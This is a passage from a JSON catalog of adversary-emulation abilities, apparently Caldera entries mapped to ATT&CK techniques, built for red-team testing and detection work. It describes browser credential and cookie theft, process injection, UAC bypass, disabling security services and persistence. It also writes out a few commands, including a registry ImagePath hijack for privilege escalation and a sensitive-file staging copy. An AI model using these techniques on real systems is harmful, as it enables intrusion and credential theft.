        "technique_id": "T1543.003",
        "repeatable": false
    },
    {
        "description": "Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg.\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hijack Execution Flow: Services Registry Permissions Weakness",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Service Registry Permissions Weakness",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "d67033955c82846f51aea6aba4afc14d",
        "technique_id": "T1574.011",
        "repeatable": false
    },
    {
        "description": "This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Screensaver",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Set Arbitrary Binary as Screensaver",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "506788e383957332249010fb89399634",
        "technique_id": "T1546.002",
        "repeatable": false
    },
    {
        "description": "The \"AddToHistoryHandler\" receives the current command as the $line variable and then returns $true if \nthe line should be written to the history file. Here we simply return $false so nothing gets added to \nthe history file for the current session. \n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Command History",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Set Custom AddToHistoryHandler to Avoid History File Logging",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "18d69a8fd988d6b63f5307ce857723c9",
        "technique_id": "T1070.003",
        "repeatable": false
    },
    {
        "description": "Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Share Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Share Discovery with PowerView",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "4b325a29e936cd1ccac2292bc92a31b5",
        "technique_id": "T1135",
        "repeatable": false
    },
    {
        "description": "This module runs the Windows executable of SharpHound in order to remotely list members of the local Administrators group (SAMR)\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Permission Groups Discovery: Local Groups",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "SharpHound3 - LocalAdmin",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "6e5ddcde678698ef20f1a9d90d81cf23",
        "technique_id": "T1069.001",
        "repeatable": false
    },
    {
        "description": "This module injects shellcode into a newly created process and executes. By default the shellcode is created,\nwith Metasploit, for use on x86-64 Windows 10 machines.\n\nNote: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office\nis required.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Injection",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Shellcode execution via VBA",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "6b55fcd6d1b26db7252faac7cf27a2ee",
        "technique_id": "T1055",
        "repeatable": false
    },
    {
        "description": "This test to simulate shortcut modification and then execute. example shortcut (*.lnk , .url) strings check with powershell;\ngci -path \"C:\\Users\" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern \"exe\" | FL.\nUpon execution, calc.exe will be launched.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Shortcut Modification",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Shortcut Modification",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "f64e72ba624a18d79c329f6bc9878cfc",
        "technique_id": "T1547.009",
        "repeatable": false
    },
    {
        "description": "This test shuts down a Windows system.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Shutdown/Reboot",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Shutdown System - Windows",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "870fe83b763d6cb8c2edc46112250bb6",
        "technique_id": "T1529",
        "repeatable": false
    },
    {
        "description": "Leverage Mavinject (signed binary) for DLL injection",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Injection: Portable Executable Injection",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Signed Binary Execution - Mavinject",
        "tactic": "defense-evasion",
        "plugin": "stockpile",
        "ability_id": "e5bcefee-262d-4568-a261-e8a20855ec81",
        "technique_id": "T1055.002",
        "repeatable": false
    },
    {
        "description": "Leverage odbcconf for DLL injection",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Injection: Dynamic-link Library Injection",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Signed Binary Execution - odbcconf",
        "tactic": "defense-evasion",
        "plugin": "stockpile",
        "ability_id": "a74bc239-a196-4f7e-8d5c-fe8c0266071c",
        "technique_id": "T1055.001",
        "repeatable": false
    },
    {
        "description": "This test attempts to open a file a specified number of times in Wordpad, then prints the contents. \nIt is designed to mimic BlackByte ransomware's print bombing technique, where tree.dll, which contains the ransom note, is opened in Wordpad 75 times and then printed. \nSee https://redcanary.com/blog/blackbyte-ransomware/. \n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Simulate BlackByte Ransomware Print Bombing",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "73d241349f2c6579d3196f01ad1cc462",
        "technique_id": "T1059.003",
        "repeatable": false
    },
    {
        "description": "Simulates patching of termsrv.dll by making a benign change to the file and replacing it with the original afterwards.\nBefore we can make the modifications we need to take ownership of the file and grant ourselves the necessary permissions.\n",
        "buckets": [
            "persistence"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Server Software Component: Terminal Services DLL",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Simulate Patching termsrv.dll",
        "tactic": "persistence",
        "plugin": "atomic",
        "ability_id": "7cd26e24cc23c5a7e1183120fa034f89",
        "technique_id": "T1505.005",
        "repeatable": false
    },
    {
        "description": "This test emulates MAZE ransomware's ability to enumerate directories using Powershell. \nUpon successful execution, this test will output the directory enumeration results to a specified file, as well as display them in the active window. \nSee https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Simulating MAZE Directory Enumeration",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "1033c974479429c54dff4470e614113d",
        "technique_id": "T1083",
        "repeatable": false
    },
    {
        "description": "Simulates an adversary accessing encrypted credentials from Google Chrome Login database. \n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Simulating access to Chrome Login Data",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "3267861a1da6d870da272e15b9ab088b",
        "technique_id": "T1555.003",
        "repeatable": false
    },
    {
        "description": "Simulates an adversary accessing encrypted credentials from Opera web browser's login database. \n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Simulating access to Opera Login Data",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "32df42a1c7b596e73b7e4eee24438994",
        "technique_id": "T1555.003",
        "repeatable": false
    },
    {
        "description": "Simulates an adversary accessing encrypted credentials from Edge web browser's login database.\nmore info in https://www.forensicfocus.com/articles/chromium-based-microsoft-edge-from-a-forensic-point-of-view/\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Simulating access to Windows Edge Login Data",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "b8c5d884f259766b9fa1e6f32666ca0f",
        "technique_id": "T1555.003",
        "repeatable": false
    },
    {
        "description": "Simulates an adversary accessing encrypted credentials from firefox web browser's login database.\nmore info in https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Simulating access to Windows Firefox Login Data",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "1a9d81f05549fb5061467e303cd8f386",
        "technique_id": "T1555.003",
        "repeatable": false
    },
    {
        "description": "executes the slui exe file handler hijack",
        "buckets": [
            "privilege-escalation"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Slui File Handler Hijack",
        "tactic": "privilege-escalation",
        "plugin": "stockpile",
        "ability_id": "b7344901-0b02-4ead-baf6-e3f629ed545f",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "The following Atomic Test will create a file with a specific name and sets its attributes to Hidden, System, and Archive. This was related to the Snake Malware campaign and is later decrypted by Snake's kernel driver.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Obfuscated Files or Information",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Snake Malware Encrypted crmlog file",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "fd4ca8f12c6d3a9af55be0211878509b",
        "technique_id": "T1027",
        "repeatable": false
    },
    {
        "description": "The following Atomic Test will write an file, comadmin.dat, to disk. From the report, Snake's installer drops the kernel driver and a custom DLL which is used to load the driver into a\nsingle AES encrypted file on disk. Typically, this file is named \u201ccomadmin.dat\u201d and is stored in the %windows%\\system32\\Com directory. \nThis Atomic Test will write a hardcoded named file to disk in the com directory named comadmin.dat.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Snake Malware Kernel Driver Comadmin",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "bdd0be771e2462e572e2ecfbe5bf2eb7",
        "technique_id": "T1547.006",
        "repeatable": false
    },
    {
        "description": "The following Atomic Test creates a registry blob in HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds, which is related to Snake Malware. Per the report, upon execution, Snake's WerFault.exe will attempt to decrypt an encrypted blob within the Windows\nregistry that is typically found at HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds. The encrypted data includes the AES key, IV, and path that is used to find and decrypt the file containing Snake's kernel driver and kernel driver loader.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Snake Malware Registry Blob",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "f4d3c5648b8d2fab9b061016eb91f478",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "The following Atomic Test will create a new service named WerFaultSvc with a binary path of WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe.\nThis was recently seen in the Snake Malware report. \nUpon execution, sc.exe will create a new service named WerFaultSvc with a bin path \\WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe and a display name of WerFault Service.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Services: Service Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Snake Malware Service Create",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "f7b58d2d5452b2ee0ce406655eb48697",
        "technique_id": "T1569.002",
        "repeatable": false
    },
    {
        "description": "Perform a packet capture",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "Elevated",
        "technique_name": "Network Sniffing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Sniff network traffic",
        "tactic": "credential-access",
        "plugin": "stockpile",
        "ability_id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7",
        "technique_id": "T1040",
        "repeatable": false
    },
    {
        "description": "Start a new calculator process",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Injection",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Spawn calculator (shellcode)",
        "tactic": "defense-evasion",
        "plugin": "stockpile",
        "ability_id": "a42dfc86-12f0-4f06-b0cf-24830c7f61f4",
        "technique_id": "T1055",
        "repeatable": false
    },
    {
        "description": "This test is designed to search a drive for credential files used by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge), export the found files to a folder, and zip it,\nsimulating how an adversary might stage sensitive credential files for exfiltration in order to conduct offline password extraction with tools like [firepwd.py](https://github.com/lclevy/firepwd) or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData). \n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Stage Popular Credential Files for Exfiltration",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "56c2f2d8b48bcb1c999d4e8929bd8d9b",
        "technique_id": "T1555.003",
        "repeatable": false
    },
    {
        "description": "Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,\nverify that the file is saved in the temp directory.\n",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data Staged: Local Data Staging",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Stage data from Discovery.bat",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "4382d53f0f53399e72c728d019fffd77",
        "technique_id": "T1074.001",
        "repeatable": false
    },
    {
        "description": "copy files to staging directory",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data Staged: Local Data Staging",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.file.path"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            },
            {
                "relationship_match": [
                    {
                        "source": "host.dir.staged"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Stage sensitive files",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
        "technique_id": "T1074.001",
        "repeatable": false
    },
    {
        "description": "Export all user certificates and add to a compressed archive.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Steal or Forge Authentication Certificates",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Staging Local Certificates via Export-Certificate",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "b41910e3770cff37dd642650f0d91672",
        "technique_id": "T1649",
        "repeatable": false
    },
    {
        "description": "Remotely executes 54ndc47 over WMI",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Windows Management Instrumentation",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "domain.user.name",
                        "edge": "has_password",
                        "target": "domain.user.password"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.basic"
            },
            {
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "has_54ndc47_copy"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.basic"
            },
            {
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "has_admin",
                        "target": "domain.user.name"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.req_like"
            },
            {
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.no_backwards_movement"
            },
            {
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "isAccessibleFrom"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.reachable"
            }
        ],
        "singleton": true,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Start 54ndc47 (WMI)",
        "tactic": "execution",
        "plugin": "stockpile",
        "ability_id": "ece5dde3-d370-4c20-b213-a1f424aa8d03",
        "technique_id": "T1047",
        "repeatable": false
    },
    {
        "description": "Start Agent using WinRM (WinRM)",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Services: Windows Remote Management",
        "requirements": [],
        "singleton": true,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Start Agent (WinRM)",
        "tactic": "lateral-movement",
        "plugin": "stockpile",
        "ability_id": "41bb2b7a-75af-49fd-bd15-6c827df25921",
        "technique_id": "T1021.006",
        "repeatable": false
    },
    {
        "description": "This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. \nOnce an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. \nNote: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Steal Web Session Cookie",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Steal Chrome Cookies (Windows)",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "f0a6a8fe9ec4afd504d22c509a9660e9",
        "technique_id": "T1539",
        "repeatable": false
    },
    {
        "description": "This test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. \nNote: If Firefox is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Steal Web Session Cookie",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Steal Firefox Cookies (Windows)",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "1690470fc24d4f33da5858999f955d2a",
        "technique_id": "T1539",
        "repeatable": false
    },
    {
        "description": "Kill all PowerShell processes",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Stop PowerShell processes",
        "tactic": "execution",
        "plugin": "stockpile",
        "ability_id": "134b49a3-3f93-41bd-85f4-563eadbb6055",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Stop and Remove Arbitrary Security Windows Service",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "f5b48f9f8e01db3edd487c05580a0e90",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.\nUpon execution cmd will run and attempt to launch desktop.ini. No windows remain open after the test\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hide Artifacts: NTFS File Attributes",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Store file in Alternate Data Stream (ADS)",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "8da7c7a6e9a5b3bf95107b38230b09f6",
        "technique_id": "T1564.004",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to suppress the windows defender notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Suppress Win Defender Notifications",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "2ebcdf9d130bd9f0c4493c9e2d211413",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Command line executed via suspicious invocation. Example is from the 2021 Threat Detection Report by Red Canary.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Suspicious Execution via Windows Command Shell",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "c3f3b1ce2eb966f2c2d64e39fb6afba1",
        "technique_id": "T1059.003",
        "repeatable": false
    },
    {
        "description": "bat files can be placed in and executed from the startup folder to maintain persistance\n\nUpon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Suspicious bat file run from startup Folder",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "ce6632edd5ed72863c2300e15c9114bb",
        "technique_id": "T1547.001",
        "repeatable": false
    },
    {
        "description": "jse files can be placed in and ran from the startup folder to maintain persistance.\nUpon execution, \"T1547.001 Hello, World JSE!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Suspicious jse file run from startup Folder",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "16e6823c4656f5cd155051f5f1e5d6ad",
        "technique_id": "T1547.001",
        "repeatable": false
    },
    {
        "description": "vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, \"T1547.001 Hello, World VBS!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Suspicious vbs file run from startup Folder",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "697e8a432031075e47cccba24417013d",
        "technique_id": "T1547.001",
        "repeatable": false
    },
    {
        "description": "Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.\nUpon execution, calc.exe will be launched.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Script Proxy Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "SyncAppvPublishingServer Signed Script PowerShell Command Execution",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "cf9f1e588dbaa2fe7062287bcb2315d6",
        "technique_id": "T1216",
        "repeatable": false
    },
    {
        "description": "Process discovery via SysInternals pstool",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "SysInternals PSTool Process Discovery",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "cc191baa-7472-4386-a2f4-42f203f1acfd",
        "technique_id": "T1057",
        "repeatable": false
    },
    {
        "description": "SocGholish performs whoami discovery commands and outputs the results to a tmp file. \nThe test will generate a filename similar to the random one generated during execution and write the file to AppData\\Temp.\n\nReference: https://redcanary.com/threat-detection-report/threats/socgholish/\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "System Discovery - SocGholish whoami",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "725f6e03f3e2098c4303861566f18894",
        "technique_id": "T1033",
        "repeatable": false
    },
    {
        "description": "Get a listing of network connections, domains, domain users, and etc.  \nsharpview.exe located in the bin folder, an opensource red-team tool.\nUpon successful execution, cmd.exe will execute sharpview.exe <method>. Results will output via stdout.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Connections Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "System Discovery using SharpView",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "0869b5ecbbe4324d7858ba54addfd9b0",
        "technique_id": "T1049",
        "repeatable": false
    },
    {
        "description": "It may be suspicious seeing a file copy of an EXE in System32 or SysWOW64 to a non-system directory or executing from a non-system directory.",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Masquerading",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "System File Copied to Unusual Location",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "bc456ce28da22e33b96257b6ae020391",
        "technique_id": "T1036",
        "repeatable": false
    },
    {
        "description": "Identify System Info. Upon execution, system info and time info will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "System Information Discovery",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "dca8b042fcdffcc1f5cddcff4122c434",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
